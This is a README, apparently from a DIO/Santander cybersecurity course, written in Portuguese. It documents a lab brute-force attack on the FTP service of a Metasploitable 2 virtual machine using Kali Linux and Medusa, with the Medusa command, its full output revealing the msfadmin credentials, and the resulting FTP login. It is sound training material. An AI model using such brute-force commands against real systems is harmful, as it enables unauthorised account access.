# DIO-Cibersecurity
Curso de Cibersegurança da DIO com parceria com o santander

Este README irá documentar a simulação de ataque de força bruta utilizando o Kali Linus e a ferramenta medusa, como alvo o Sistema METASPLOITABLE 2 (chamado de META).

- Preparação do ambiênte
Instalação do ambiênte Kali no Virtual box, bem como do METASPLOITABLE.
Utilizar a placa de rede como (Placa de rede exclusiva de hospedeiro), para os sistemas se enxergarem.

- Para começar foi necessário fazer a verificação de qual o IP do META.
- Após a descoberta inicei os preparativos no KALI.
- Fiz inicialmente o ping para confirmar o alvo utilizando `ping -c 3 192.168.56.103`


- Iniciando o ataque simulado de FTP com a ferramenta Medusa.
  Ao iniciar o ataque com a ferramenta medusa foi utilizado o seguinte comando para testar as senhas previamente configuradas.
  - Senhas foram obtidas por meio de previo estudo de senhas passadas pela instrutora.
  Iniciando o ataque com o comando - `medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6`
como resultado obtive a seguinte resposta.

`Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-27 22:58:25 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 1 complete) Password: msfadmin (1 of 4 complete)

**2025-11-27 22:58:25 ACCOUNT FOUND: [ftp] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]**

2025-11-27 22:58:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 2 complete) Password: 123456 (1 of 4 complete)

2025-11-27 22:58:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 2 complete) Password: password (2 of 4 complete)

2025-11-27 22:58:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 3 complete) Password: querty (3 of 4 complete)

2025-11-27 22:58:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 3 complete) Password: querty (2 of 4 complete)

2025-11-27 22:58:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 3 complete) Password: 123456 (3 of 4 complete)

2025-11-27 22:58:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 3 complete) Password: password (4 of 4 complete)

2025-11-27 22:58:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 4 complete) Password: msfadmin (4 of 4 complete)

2025-11-27 22:58:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: 123456 (1 of 4 complete)

2025-11-27 22:58:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: password (2 of 4 complete)

2025-11-27 22:58:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: querty (3 of 4 complete)

2025-11-27 22:58:33 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: msfadmin (4 of 4 complete)
`

Deixei marcado a senha que foi obtida.
Agora só abrir o sistema FTP da máquina testada para verificar.

`ftp 192.168.56.103 
Connected to 192.168.56.103.
220 (vsFTPd 2.3.4)
**Name (192.168.56.103:keven): msfadmin**
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> `
